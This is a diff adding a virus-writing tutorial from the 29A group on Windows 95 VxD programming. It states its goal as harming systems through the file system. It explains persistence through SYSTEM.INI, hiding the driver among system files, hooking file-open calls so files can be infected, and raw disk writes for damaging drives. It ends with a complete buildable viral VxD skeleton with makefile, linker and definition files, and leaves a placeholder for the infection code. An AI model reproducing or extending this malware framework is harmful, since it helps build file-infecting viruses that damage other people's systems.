@@ -1,0 +1,959 @@
+ Virus oriented VxD writing tutorial
+ ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>
+                                                                   GriYo/29A
+
+ This tutorial represents just a minimum introduction to VxD programming. To
+ dominate the subject it deals with  you need something more than this tuto-
+ rial. Nevertheless, I've tried to explain everything very clearly, so noone
+ stays on land ;)
+
+
+ What is a VxD?
+ ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+ Well, let's go with  what we're interested on. A VxD is a 32-bit code chunk
+ which executes in protected mode with  RING-0 priviledge level. This is be-
+ cause they  have to  deal with system's resources, such as hardware devices
+ and installed software. I hope after reaching  this point there is no doubt
+ about our intentions, right? it's about  writing a VxD to control installed
+ software (of course!). To achieve this, we'll pinch the system where we can
+ cause more harm, the file system.
+
+
+ How to start
+ ÄÄÄÄÄÄÄÄÄÄÄÄ
+ Before getting on to work we  must get some tools. This software is availa-
+ ble in the  Microsoft Developer Network  and a couple places more. You will
+ need to get your hands on them if you're interesting on writing VxDs.
+
+
+   - Microsoft Macro Assembler (i used 6.11c).
+   - Linear-Executable Linker (i used 1.00.058).
+   - Microsoft SDK's ADDHDR.EXE and MAPSYM32.EXE.
+
+
+ Since the first  viruses for Windows95 written as VxD sources started to go
+ around, I've found many people  who look for the includes needed to compile
+ these sources. You will need the following files from the SDK:
+
+
+   - VMM.INC   : in this file you can find the macros and the defines of the
+                 Virtual Machine Manager services.
+   - DEBUG.INC : only if you need to debug.
+   - SHELL.INC : this file declares the services which provide access to ma-
+                 ny Windows functions, such as MessageBox.
+   - IFS.INC and
+   - IFSMGR.INC: they're only  necessary if we want  to fuck around with the
+                 Windows95 file system.
+
+
+ The include files appear in the source  between the .xlist and .list direc-
+ trices.
+
+
+ Writing a VxD
+ ÄÄÄÄÄÄÄÄÄÄÄÄÄ
+ Writing a VxD  is something  extremely easy  if we use a  generic source on
+ which we will add our code. Let's divide the work into several stages, this
+ way we may install and test the virus once we've completed each stage.
+
+ First start with a generic VxD which contains  the segment, VxD and control
+ process declares. Later add the initialization procedure in real mode which
+ is, as we will see, the well-known  residency check. Now write the VxD ini-
+ tialization and file-hooking processes. And finally write the remaining VxD
+ procedures.
+
+
+ VxD segments
+ ÄÄÄÄÄÄÄÄÄÄÄÄ
+ Inside the VxD we can  find five different  types of segments, each of them
+ with its own  characteristics. So  as to declare these  segments we can use
+ the following macros:
+
+
+   - VxD_CODE_SEG and VxD_CODE_ENDS: also called _LTEXT, this is the protec-
+     ted mode code segment. The declare of this segment is compulsory.
+
+   - VxD_DATA_SEG and VxD_DATA_ENDS: also  called _LDATA, they  declare  the
+     data segment for global use in the VxD. It's also needed to declare it.
+
+   - VxD_ICODE_SEG and VxD_ICODE_ENDS: also  called _ITEXT. These two macros
+     define  the beginning and  the end of the protected mode initialization
+     code segment. This segment is optional and  is discarded once completed
+     the initialization (after receiving the Init_Complete message).
+
+   - VxD_IDATA_SEG and VxD_IDATA_ENDS: also called _IDATA, here we may write
+     all the necessary data for the initialization, which are discarded once
+     the Init_Complete message is received. Its use is optional.
+
+   - VxD_REAL_INIT_SEG and VxD_REAL_INIT_ENDS: this optional segment, called
+     also _RTEXT, contains the  procedure  which the Virtual Machine Manager
+     will call before loading the  rest of the VxD. It is discarded once the
+     procedure returns.
+
+
+ All these  segments, except for _RTEXT (real mode initialization), are pro-
+ tected mode segments over  a flat  memory model. This means offsets are 32-
+ bit and we will have to use the "offset32" macro in all the places in which
+ we used "offset"  before. Now CS, DS, ES and SS can't be modified, but ins-
+ tead we can use FS and GS.
+
+
+ VxD declaration
+ ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+ In order to declare our VxD we'll use the following macro:
+
+
+   Declare_Virtual_Device name, major version, minor version, control proce-
+   dure, device-ID, init order, V86 API handler, protected mode API handler
+
+
+ Fuck, at first sight it looks a terrible thing, but lemme write an example,
+ which i'm sure will change this first impression. We'll declare a VxD named
+ ViRuS, which will be 1.0 version of our virus.
+
+
+   Declare_Virtual_Device ViRuS,1,0,VxD_Control,Undefined_Device_ID,,,
+
+
+ As you can see I haven't used the  last parameters, as we ain't neither in-
+ terested in providing an API for other programs nor in init order (later?).
+
+
+ VxD-ID
+ ÄÄÄÄÄÄ
+ It is a number which lets us differ an VxD from other. This is necessary if
+ the VxD provides  other programs an API or if it provides services to other
+ VxDs. In our case we'll use Undefined_Device_ID as ID.
+
+
+ VxD Control Procedure
+ ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+ The Virtual Machine Manager  sends  control  messages to the VxD using this
+ procedure. This way it notifies several VxDs about certain events. Followin
+ our last example, our control procedure would look like this:
+
+
+   BeginProc VxD_Control   ; Name of control procedure which we
+                           ; declared with the VxD
+
+   Control_Dispatch Sys_Critical_Init, ViRuS_Critical_Init
+   Control_Dispatch Device_Init, ViRuS_Device_Init
+
+   EndProc VxD_Control
+
+
+ By doing this we're declaring  which  procedures will  run whenever certain
+ system control messages  are received. That is, run the ViRuS_Critical_Init
+ procedure when a Sys_Critical_Init  is received, and whenever a Device_Init
+ message is received, run the ViRuS_Device_Init procedure.
+
+
+ System Control Messages
+ ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+ As we have said, the Virtual Machine Manager sends  messages to  VxDs so as
+ to notify about certain changes in the system. There are many different me-
+ ssages, but, as we are only beginners, we are interested just in a few:
+
+
+   - Sys_Critical_Init: this is  the first message  our VxD will receive. As
+     interruptions  haven't been enabled yet, neither Simulate_Int nor Exec_
+     Int may be used. Other init services are at our disposal, such as, Get_
+     Exec_Path, which will provide us with the directory to install our VxD.
+
+   - Device_Init: second message, which tells us interruptions are available
+     now. It will be there, where we'll hang to the file system.
+
+   - Init_Complete: third and last message related to system init. On return
+     from the procedure which controls this message, the Virtual Machine Ma-
+     nager will  discard the segments which contain code and data for the i-
+     nit (_ITEXT and _IDATA respectively).
+
+   - System_Exit: this is the first message we will get on system shut down.
+     Although interruptions are enabled, the services Simulate_Int and Exec_
+     Int mustn't be used.
+
+   - Sys_Critical_Exit: last shut down message, everything is clear...
+
+
+ In order to tell Windows95 to load  our VxD we must  add a line, DEVICE=VI-
+ RUS.VxD, to  the [386Enh] section in  the SYSTEM.INI, then copy  the VxD to
+ the \SYSTEM directory and reboot the system. Another solution is shown, for
+ instance, in the Win95.Lizard virus by Reptile/29A, included in this issue.
+ The trick consists on using the \IOSUBSYS directory.
+
+ Windows95 may load a VxD dinamically, which is very interesting. However it
+ carries the use of new messages to notify the dinamic start and stop. These
+ techniques are not included in the objectives of  this article because they
+ are part of a more advanced subject and #$%!@!!! because I don't wanna was-
+ te the rest of my life writing this! :P
+
+
+ Real mode initialization
+ ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+ Thsi is the only part of a VxD in real mode. It runs  on start  of VxD load
+ an initialization process. This procedure may be  used to avoid the loading
+ of the VxD, the loading  of Windows, etc. We will use it for  our residency
+ check, and avoid loading again  the VxD if it  was already loaded. The Vir-
+ tual Machine Manager calls this procedure with the following parameters:
+
+
+   AX  -> VMM version number.
+
+           AH -> major version.
+           AL -> minor version.
+
+   BX  -> Flags on load.
+
+           Duplicate_Device_ID  -> a VxD with the same ID has been loaded.
+           Duplicate_From_INT2F -> same as the previous one, from int 2fh.
+           Loading_From_INT2F   -> self explanatory :)
+
+   ECX -> 32-bit pointer, points to the entry  for the real mode initializa-
+          tion services routine, which allows things such as reading the re-
+          gistry or SYSTEM.INI.
+
+   EDX -> pointer to int 2fh provided data, or null.
+
+   SI  -> environment segment address, as passed by MS-DOS.
+
+
+ Our VxD may indicate the Virtual  Machine Manager to  perform several func-
+ tions, such as reserving physical pages, by returned parameters:
+
+
+   AX  -> action.
+
+           Abort_Device_Load: this is  the value  which we  will return when
+           the VMM tells us of a previously loaded VxD with the same VxD-ID.
+           Prevents the VxD from being loaded without disturbing other VxDs.
+
+           Abort_Win386_Load: tells VMM that everything is screwed up and it
+           should better not load Windows (which is nearly always) :P
+
+           Device_Load_Ok: when VMM receives this value, it understands that
+           initialization is running with  no problems, and that the loading
+           process must continue.
+
+           No_Fail_Message: this value is used in combination with Abort_De-
+           vice_Load and with Abort_Win386_Load to prevent some error messa-
+           ges from appearing as a result of aborting Win or VxD loading.
+
+   BX  -> points to an  array with the  numbers of the  pages to reserve for
+          the VxD. This array ends in a NULL and contains pages ranging from
+          0000h to 0100h. If we don't want to reserve  any pages, this value
+          is kept equal to 0000h.
+
+   EDX -> reference data, by now we'll set it to 00000000h.
+
+   SI  -> instance data, we'll also set it to 0000h.
+
+
+ VMM services of our interest
+ ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+ The Virtual Machine Manager is the heart of the  operating system, as it is
+ it the encharged to manage every virtual machine (hence, VMM). Moreover, it
+ offers several services, some of which I'll describe as an example.
+
+
+   Get_Cur_VM_Handle
+   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+   Get in EBX a handle about the VM being executed right now.
+
+
+        VMMcall Get_Cur_VM_Handle
+        mov [VM_handle],ebx
+
+
+   Get_Sys_VM_Handle
+   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+   Get in EBX a handle about the system VM.
+
+
+        VMMcall Get_Sys_VM_Handle
+        mov [SysVM_handle],ebx
+
+
+   Get_VMM_Version
+   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+   Get info about the VMM version.
+
+
+        VMMcall Get_VMM_Version
+        mov [Major],ah                  ; Major version number
+        mov [Minor],al                  ; Minor version number
+        mov [Debug],ecx                 ; Revision number
+
+
+   Get_Config_Directory
+   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+   This great function provides  us with the complete  path to the directory
+   where Windows mantains the system files such as SYSTEM.INI.
+
+
+        VMMcall Get_Config_Directory
+        mov [win_path],edx
+
+
+   Get_Exec_Path
+   ÄÄÄÄÄÄÄÄÄÄÄÄÄ
+   Get a pointer to the  path where  Windows keeps  the VMM32.VXD file. This
+   will be  the best directory regarding  to save our viral VxD, hidden bet-
+   ween system files in \SYSTEM.
+
+
+        VMMcall Get_Exec_Path
+        mov [path_ptr],edx
+        mov [length],ecx
+
+
+   The ECX register keeps  the number of  characters in the path string, in-
+   cluding last backlash "\".
+
+
+   _HeapAllocate
+   ÄÄÄÄÄÄÄÄÄÄÄÄÄ
+   Allocate memory in system's heap.
+
+
+        VMMcall _HeapAllocate,<#bytes,flags>
+
+        or eax,eax                      ; eax = 00h if error
+        jz not_allocated
+        mov [block_ptr], eax            ; Pointer to allocated block
+
+
+        #bytes -> specifies number of bytes to allocate
+
+        flags  -> refers to the following flags:
+
+           HEAPLOCKEDIFDP: allocate a memory block in a locked zone, only if
+           using MS-DOS or BIOS functions in order to page.
+
+           HEAPINIT: this flag can  only be specified during initialization.
+           It allocates a memory block which will be automatically freed on-
+           ce init is completed.
+
+           HEAPSWAP: the block is allocated in a paged memory zone.
+
+           HEAPZEROINIT: the allocated block is initialized with 00h's.
+
+
+   _HeapFree
+   ÄÄÄÄÄÄÄÄÄ
+   Free a memory block allocated with last function.
+
+
+        VMMcall _HeapFree,<block_ptr,flags>
+
+        or eax,eax                      ; eax = 00h if error
+        jz error
+
+
+   Hook_V86_Int_Chain
+   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+   Add a new handler to a V86 interruption. Gollum  virus uses  this service
+   in order to monitor calls to the interrupt 21h.
+
+
+        mov eax,int_number              ; Int to hook
+        mov esi,OFFSET32 my_handler     ; Pointer to our handler
+        VMMcall Hook_V86_Int_Chain
+        jc error                        ; Carry set if error encountered
+
+
+   System calls new controller like this:
+
+
+        mov eax,int_number              ; Interruption
+        mov ebx, VM                     ; Running VM handler
+        mov ebp, OFFSET32 crs           ; Pointer to the Client_Reg_Struc
+        call [my_handler]
+
+        jc pass_to_next                 ; Carry set if the funciton wasnt
+                                        ; dispensed
+
+
+   We also have an Unhook_V86_Int_Chain, whose mission is to free the inter-
+   ruption handler just installed.
+
+
+        mov eax,int_number              ; Int number
+        mov esi,OFFSET32 Hook_Proc      ; Address to the procedure which
+                                        ; will be erased from the chain
+
+        VMMcall Unhook_V86_Int_Chain
+        jc error                        ; Carry set if error encountered
+
+
+ Installable File System
+ ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+ Here we have all those functions which we continuously use in MS-DOS and a-
+ llow us to open files, read them, etc... it will be here where we will hook
+ our virus so as to monitor every operation the system will perform on files
+ in order to infect them. But let's go step by step.
+
+ To perform our operations on files we will use a service which will provide
+ us with the most common functions such as read, write, etc. Here it is:
+
+
+        mov eax,R0_OPENCREATFILE        ; Function to call
+
+                                        ; Requiered Params
+        mov cx,0                        ; - Attributes
+        mov bx,2                        ; - Flags
+        mov dx,0011h                    ; - Action and special flags
+        mov esi,OFFSET32 filename       ; - Guess what??? ;)
+
+        VxDCall IFSMgr_Ring0_FileIO     ; And finally, the call
+
+
+ Then the only thing we need in order to start  is to know how to call every
+ function and how to pass  the params. Well, this is the I/O form of some of
+ the functions we will mostly use...
+
+
+   OpenCreateFile
+   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+   We will use this function to open or create files. Input params are:
+
+
+        EAX -> function R0_OPENCREATFILE
+        BX  -> open mode and flags *
+        CX  -> attributes
+        DH  -> special flags (R0_NO_CACHE, R0_SWAPPER_CALL)
+        DL  -> action to perform *
+        ESI -> pointer to the filename string
+
+   And output parameters are:
+
+        if CF=0
+
+           EAX -> file handle
+           ECX -> performed action *
+
+        if CF=1 error
+
+   * = Check int 21h function 6ch
+
+
+   ReadFile
+   ÄÄÄÄÄÄÄÄ
+   With R0_READFILE we'll read bytes from a previously opened file (with the
+   R0_OPENCREATEFILE call). Following parameters are expected:
+
+
+        EAX -> R0_READFILE
+        EBX -> file handle
+        ECX -> bytes to read
+        EDX -> place on file where to start reading
+        ESI -> pointer to buffer where to write data
+
+   Output:
+
+        if CF=0 then ECX = number of read bytes
+        if CF=1 error
+
+
+   WriteFile
+   ÄÄÄÄÄÄÄÄÄ
+   That is, write into a file, params are:
+
+
+        EAX -> R0_WRITEFILE
+        EBX -> file handle
+        ECX -> bytes to write
+        EDX -> place in file where to start writing
+        ESI -> pointer to the data we want to write
+
+   Output:
+
+        if CF=0 then ECX = number of written bytes
+        if CF=1 error
+
+
+   CloseFile
+   ÄÄÄÄÄÄÄÄÄ
+   In order to close a just infected file ;) The input params are:
+
+
+        EAX -> R0_CLOSEFILE
+        EBX -> file handle
+
+   Output:
+
+        if CF=0 file was closed ok
+        if CF=1 error (AX = errorcode)
+
+
+   GetFileSize
+   ÄÄÄÄÄÄÄÄÄÄÄ
+   I'm sure we'll find it useful. Use these parameters:
+
+
+        EAX -> R0_GETFILESIZE
+        EBX -> file handle
+
+   As a result:
+
+        if CF=0 then EAX = file size in bytes
+        if CF=1 error (AX = errorcode)
+
+
+ And well, we could start now, however  we'll still  need some more, such as
+ FileAttributes, RenameFile, DeleteFile, or GetDiskFreeSpace. As  a colorful
+ note we  also have WriteAbsoluteDisk and ReadAbsoluteDisk  to fuck around a
+ bit if we don't like hard drives... :)
+
+ So we already know how to get on files, now we  need to know how to hook up
+ to the File System so we can monitor its activity. We'll use an IFS manager
+ service, like this:
+
+
+        mov eax,OFFSET32 hook_procedure         
+        push eax                                
+        VxDCall IFSMgr_InstallFileSystemApiHook 
+        add esp,0004h                           
+        or eax,eax                              
+        jz error
+        mov dword ptr [prev_hook],eax
+        ;Continue initialization process
+        clc
+        ret
+ error:
+        stc
+        ret
+
+
+ This way we tell the file system the address of our monitor procedure. Lets
+ see an example on writing this procedure...
+
+
+hook_procedure:
+
+        ; Follow C calls rules
+        push ebp
+        mov ebp,esp
+        sub esp,20h
+
+        ; At this point we can address the following params using
+        ; the stack:
+
+        ; ebp+00h -> saved EBP value.
+        ; ebp+04h -> return address.
+        ; ebp+08h -> supplies the address of the FSD function that
+        ;            is to be called for this API.
+        ; ebp+0Ch -> supplies the function that is being performed.
+        ; ebp+10h -> supplies the 1-based drive the operation is being
+        ;            performed on (-1 if UNC).
+        ; ebp+14h -> supplies the kind of resource the operation is being
+        ;            performed on.
+        ; ebp+18h -> supplies the codepage that the user string was
+        ;            passed in on.
+        ; ebp+1Ch -> supplies pointer to IOREQ structure.
+
+        ;            Total 20h bytes
+
+        ; Next we'll do is check if this call has been performed by
+        ; the virus while infecting a file
+
+        ; Using a switch, we'll avoid dropping into an endless loop.
+
+        cmp dword ptr [our_own_call],"BUSY"
+        je exit_FS_hook
+
+        ; This is the moment in which we check the function being called
+
+        cmp dword ptr [ebp+0Ch],IFSFN_OPEN
+        je virus_OPEN_FILE
+
+exit_FS_hook:
+
+        mov eax,dword ptr [ebp+1Ch]
+        push eax
+        mov eax,dword ptr [ebp+18h]
+        push eax
+        mov eax,dword ptr [ebp+14h]
+        push eax
+        mov eax,dword ptr [ebp+10h]
+        push eax
+        mov eax,dword ptr [ebp+0Ch]
+        push eax
+        mov eax,dword ptr [ebp+08h]
+        push eax
+
+        ; Finally let's call last IFS monitor procedure
+
+        mov eax,dword ptr [Prev_IFS_Hook]
+        call dword ptr [eax]
+
+        ; The procedure is responsible for clearing the stack before
+        ; RETurning the control to the caller
+
+        add esp,00000018h
+
+        ; RETurn
+
+        leave
+        ret
+
+
+ Cannonicalized paths
+ ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+ Every path IFS manager passes  to the FSD's is in Unicode. A cannonicalized
+ path has quite different structure from that of C:\DOS we know so well ;)
+
+
+ This structure composes of:
+
+   1 WORD with the path's length (including this WORD but not the final NULL
+   character).
+        
+   1 WORD with the offset of the path  element of the string, each path ele-
+   ment keeps info about a path's part.
+
+   Various  path elements. Their structure  is composed  of 1 WORD  with the
+   pathname length (including  the self WORD) followed by  an Unicode string
+   with the name of that path element.
+
+ All cannonicalized paths contain a complete path from the partition root.
+
+
+ Installable File System services
+ ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+ Some of these services have the format of a call in C so parameters are ac-
+ tually saves in  the stack, depending on the  function's necessities. Other
+ services are written to be called from ASM, hence loading the params in the
+ pertinent registers. The only service which can be useful for now is IFSMgr
+ _GetVersion, which allows us to check IFS's version.
+
+
+   IFSMgr_GetVersion
+
+        Input:
+
+           There are now input parameters
+
+        Output:
+
+           If CF=0 then EAX keeps the IFS manager version number
+           If CF=1 error
+
+
+ Generic viral VxD
+ ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+ This is an example for a generical viral VxD, over which  to write the rest
+ of the code. The project is composed of the following files:
+
+
+        VIRUS.ASM               ; ASM source with the viral VxD
+        VIRUS.DEF               ; Module definition file
+        VIRUS.LNK               ; Linker specifications file
+        MAKEFILE                ; Project file
+
+; - -[VIRUS.ASM]- - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
+
+MASM=1
+
+	.386p
+	.XLIST
+        INCLUDE VMM.Inc
+	INCLUDE ifs.inc
+	INCLUDE ifsmgr.inc
+        INCLUDE SheLL.Inc
+
+	.LIST
+
+Declare_Virtual_Device VXD, 1, 0, VXD_Control, Undefined_Device_ID ,,,
+
+VxD_REAL_INIT_SEG
+
+;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+;³ Virus95 real mode initialization code                                    ³
+;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+BeginProc VxD_Real_Init_Proc
+
+        ; Installation check
+
+        test bx,Duplicate_Device_ID
+        jnz short abort_virus_load
+
+        ; Dont use any exclusion,instance or reference data
+
+        xor bx,bx
+        xor si,si
+        xor edx,edx
+
+        ; Not installed, load device
+
+        mov ax,Device_Load_Ok
+	ret
+
+abort_virus_load:
+
+        ; Abort device loading process
+
+        mov ax,Abort_Device_Load or No_Fail_Message
+	ret
+
+EndProc VxD_Real_Init_Proc
+
+VxD_REAL_INIT_ENDS
+
+VxD_LOCKED_DATA_SEG
+
+        ; We have read/write access to locked code segment because
+        ; its into a loked data segment
+
+VxD_LOCKED_CODE_SEG
+
+;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+;³ Virus95 device init                                                      ³
+;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+BeginProc VXD_Device_Init
+
+        ; This initialization code is into VxD_LOCKED_CODE_SEG
+        ; in order to avoid paging while fucking around with IFS.
+
+        ; Check installable file system version
+
+        cld
+        VxDCall IFSMgr_Get_Version
+        jc exit_device_init
+
+        ; Get path of WIN386.EXE
+
+        VMMCall Get_Exec_Path
+
+        ; Copy path to our buffer
+
+        mov esi,edx
+        mov edi,OFFSET32 VxD_File_Name
+        cld
+        rep movsb
+
+        ; Write name of our VxD file next to the path
+
+        mov esi,OFFSET32 virus_VxD_Name
+        mov ecx,0Bh
+        cld
+        rep movsb
+
+        ; At this point we have the path and name of our
+        ; virual VxD into the Windos \SYSTEM directory...
+        ; We can read it on a buffer or copy it directly
+        ; while infecting the file...
+                                    
+        ; Following service is called to install a filesystem API hook.
+        ; This should be called by a VxD that wants to hook the
+        ; filesystem api call and do special processing on them.
+        ; The IFS manager returns a pointer of the next hooker in the
+        ; chain.
+        
+        mov eax,OFFSET32 virus_FS_Monitor
+        push eax
+        VxDCall IFSMgr_InstallFileSystemApiHook
+
+        ; If this function is failed for reasons such as out of memory,
+        ; the return value is 0.
+
+        add esp,00000004h
+        
+        or eax,eax
+        jz error_device_init
+        mov dword ptr [Prev_IFS_Hook],eax
+
+exit_device_init:
+
+        ; Continue initialization process
+
+        clc  
+	ret
+
+error_device_init:
+        stc
+        ret
+
+EndProc VXD_Device_Init
+
+;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+;³ Virus95 file API hook                                                    ³
+;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+BeginProc virus_FS_Monitor
+
+        ; Errr... Using C calling conventions
+
+        push ebp
+        mov ebp,esp
+        sub esp,20h
+
+        ; Parameters into stack:
+
+        ; ebp+00h -> saved EBP value.
+        ; ebp+04h -> return address.
+        ; ebp+08h -> supplies the address of the FSD function that
+        ;            is to be called for this API.
+        ; ebp+0Ch -> supplies the function that is being performed.
+        ; ebp+10h -> supplies the 1-based drive the operation is being
+        ;            performed on (-1 if UNC).
+        ; ebp+14h -> supplies the kind of resource the operation is being
+        ;            performed on.
+        ; ebp+18h -> supplies the codepage that the user string was
+        ;            passed in on.
+        ; ebp+1Ch -> supplies pointer to IOREQ structure.
+
+        ;            Total 20h bytes
+
+        ; Check if we are trying to process our own IFS calls
+
+        cmp dword ptr [our_own_call],"BUSY"
+        je exit_FS_hook
+
+        ; Check for OPEN
+        ; This function is called also before execution...
+
+        cmp dword ptr [ebp+0Ch],IFSFN_OPEN
+        je virus_OPEN_FILE
+
+exit_FS_hook:
+
+        ; Prepare parameters for calling previous FS API hook
+
+        mov eax,dword ptr [ebp+1Ch]
+        push eax
+        mov eax,dword ptr [ebp+18h]
+        push eax
+        mov eax,dword ptr [ebp+14h]
+        push eax
+        mov eax,dword ptr [ebp+10h]
+        push eax
+        mov eax,dword ptr [ebp+0Ch]
+        push eax
+        mov eax,dword ptr [ebp+08h]
+        push eax
+
+        ; Call previous hook
+
+        mov eax,dword ptr [Prev_IFS_Hook]
+        call dword ptr [eax]
+
+        ; IFS hooker needs to fix the stack before return to caller
+
+        add esp,00000018h
+
+        ; Back to caller
+
+        leave
+        ret
+
+;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+;³ Open file/create a file                                                  ³
+;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+virus_OPEN_FILE:
+
+        ; Save regs
+        pushfd
+        pushad
+
+        ; Set IFS busy flag
+        mov dword ptr [our_own_call],"BUSY"
+
+        ; Put here code to process filename and infect it
+       
+        ; Reset IFS busy field
+
+        mov dword ptr [our_own_call],"FREE"
+
+        ; Get regs back
+
+        popad
+        popfd
+        jmp exit_FS_hook                             
+         
+EndProc virus_FS_Monitor
+
+;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+;³ Virus95 VxD control dispatcher                                           ³
+;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+BeginProc VXD_Control
+
+        Control_Dispatch Device_Init, VxD_Device_Init       
+        clc
+	ret
+
+EndProc VXD_Control
+
+VxD_LOCKED_CODE_ENDS
+
+;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+;³ Virus buffers into locked data segment                                   ³
+;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+Prev_IFS_Hook           dd 00000000h            ;Previous IFS hooker     
+our_own_call            db "EERF"
+VxD_File_Name           db 80h dup (00h)        ;Path of virus VxD
+virus_VxD_Name          db "virus.VXD",00h      ;Name of virus VxD file
+
+VxD_LOCKED_DATA_ENDS
+
+	END
+
+; - -[VIRUS.DEF]- - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
+
+LIBRARY     VXD
+DESCRIPTION 'ViRuS95'
+EXETYPE     DEV386
+
+SEGMENTS
+            _LTEXT PRELOAD NONDISCARDABLE
+            _LDATA PRELOAD NONDISCARDABLE
+            _ITEXT CLASS 'ICODE' DISCARDABLE
+            _IDATA CLASS 'ICODE' DISCARDABLE
+            _TEXT  CLASS 'PCODE' NONDISCARDABLE
+            _DATA  CLASS 'PCODE' NONDISCARDABLE
+
+EXPORTS
+            VXD_DDB @1
+
+; - -[VIRUS.LNK]- - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
+
+VIRUS.obj
+VIRUS.vxd /NOI /NOD /NOP
+VIRUS.map /MAP
+
+VIRUS.def
+
+; - -[MAKEFILE] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
+
+NAME = VIRUS
+
+LINK = link386.exe
+
+!ifdef DEBUG
+DDEBUG  =-DDEBLEVEL=1 -DDEBUG
+!else
+DDEBUG  =-DDEBLEVEL=0
+!endif
+
+all : VIRUS.vxd
+
+ASM    = ml
+#AFLAGS = -coff -DBLD_COFF -DIS_32 -W2 -c -Cx -Zm -DMASM6 $(DDEBUG)
+AFLAGS = -DBLD_COFF -DIS_32 -W2 -c -Cx -Zm -DMASM6 $(DDEBUG)
+ASMENV = ML
+
+VIRUS.vxd: VIRUS.def VIRUS.obj
+        link386 @VIRUS.lnk
+        addhdr VIRUS.vxd
+        mapsym32 VIRUS
